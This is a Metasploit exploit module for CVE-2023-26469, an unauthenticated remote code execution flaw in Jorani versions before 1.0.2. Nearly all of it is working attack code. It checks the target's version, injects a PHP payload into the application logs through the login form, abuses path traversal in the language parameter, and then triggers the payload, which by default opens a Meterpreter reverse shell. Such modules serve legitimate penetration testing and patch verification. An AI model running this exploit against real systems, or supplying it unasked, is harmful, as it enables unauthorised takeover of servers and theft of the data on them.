##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Jorani unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits an unauthenticated Remote Code Execution in Jorani prior to 1.0.2.
          It abuses 3 vulnerabilities: log poisoning and redirection bypass via header spoofing, then it uses path traversal to trigger the vulnerability.
          It has been tested on Jorani 1.0.0.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'RIOUX Guilhem (jrjgjk)'
        ],
        'References' => [
          ['CVE', '2023-26469'],
          ['URL', 'https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py']
        ],
        'Platform' => %w[php],
        'Arch' => ARCH_PHP,
        'Targets' => [
          ['Jorani < 1.0.2', {}]
        ],
        'DefaultOptions' => {
          'PAYLOAD' => 'php/meterpreter/reverse_tcp',
          'RPORT' => 443,
          'SSL' => true
        },
        'DisclosureDate' => '2023-01-06',
        'Privileged' => false,
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )
 
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path of Jorani', '/'])
      ]
    )
  end
 
  def get_version(res)
    footer_text = res.get_html_document.xpath('//div[contains(@id, "footer")]').text
    matches = footer_text.scan(/v([0-9.]+)/i)
    if matches.nil? || matches[0].nil?
      print_error('Cannot recovered Jorani version...')
      return nil
    end
    matches[0][0]
  end
 
  def service_running(res)
    matches = res.get_html_document.xpath('//head/meta[@description]/@description').text.downcase.scan(/leave management system/)
    if matches.nil?
      print_error("Jorani doesn't appear to be running on the target")
      return false
    end
    true
  end
 
  def recover_csrf(res)
    csrf_token = res.get_html_document.xpath('//input[@name="csrf_test_jorani"]/@value').text
    return csrf_token if csrf_token.length == 32
 
    nil
  end
 
  def check
    # For the check command
    print_status('Checking Jorani version')
    uri = normalize_uri(target_uri.path, 'index.php')
 
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => "#{uri}/session/login"
    )
 
    if res.nil?
      return Exploit::CheckCode::Safe('There was a problem accessing the login page')
    end
 
    return Exploit::CheckCode::Safe unless service_running(res)
 
    print_good('Jorani seems to be running on the target!')
 
    current_version = get_version(res)
    return Exploit::CheckCode::Detected if current_version.nil?
 
    print_good("Found version: #{current_version}")
    current_version = Rex::Version.new(current_version)
 
    return Exploit::CheckCode::Appears if current_version < Rex::Version.new('1.0.2')
 
    Exploit::CheckCode::Safe
  end
 
  def exploit
    # Main function
    print_status('Trying to exploit LFI')
 
    path_trav_payload = '../../application/logs'
    header_name = Rex::Text.rand_text_alpha_upper(16)
    poison_payload = "<?php if(isset($_SERVER['HTTP_#{header_name}'])){ #{payload.encoded} } ?>"
    log_file_name = "log-#{Time.now.strftime('%Y-%m-%d')}"
 
    uri = normalize_uri(target_uri.path, 'index.php')
 
    res = send_request_cgi(
      'method' => 'GET',
      'keep_cookies' => true,
      'uri' => "#{uri}/session/login"
    )
 
    if res.nil?
      print_error('There was a problem accessing the login page')
      return
    end
 
    print_status('Recovering CSRF token')
    csrf_tok = recover_csrf(res)
    if csrf_tok.nil?
      print_status('CSRF not found, doesn\'t mean its not vulnerable')
    else
      print_good("CSRF found: #{csrf_tok}")
    end
    print_status('Poisoning log with payload..')
    print_status('Sending 1st payload')
 
    send_request_cgi(
      'method' => 'POST',
      'keep_cookies' => true,
      'uri' => "#{uri}/session/login",
      'data' => "csrf_test_jorani=#{csrf_tok}&"                  \
                'last_page=session/login&'                       \
                "language=#{path_trav_payload}&"                 \
                "login=#{Rex::Text.uri_encode(poison_payload)}&" \
                "CipheredValue=#{Rex::Text.rand_text_alpha(14)}"
    )
 
    print_status("Including poisoned log file #{log_file_name}.php")
    vprint_warning('The date on the attacker and victim machine must be the same for the exploit to be successful due to the timestamp on the poisoned log file. Be careful running this exploit around midnight across timezones.')
    print_good('Triggering payload')
 
    send_request_cgi(
      'method' => 'GET',
      'keep_cookies' => true,
      'uri' => "#{uri}/pages/view/#{log_file_name}",
      'headers' =>
      {
        'X-REQUESTED-WITH' => 'XMLHttpRequest',
        header_name => Rex::Text.rand_text_alpha(14)
      }
    )
 
    nil
  end
end
 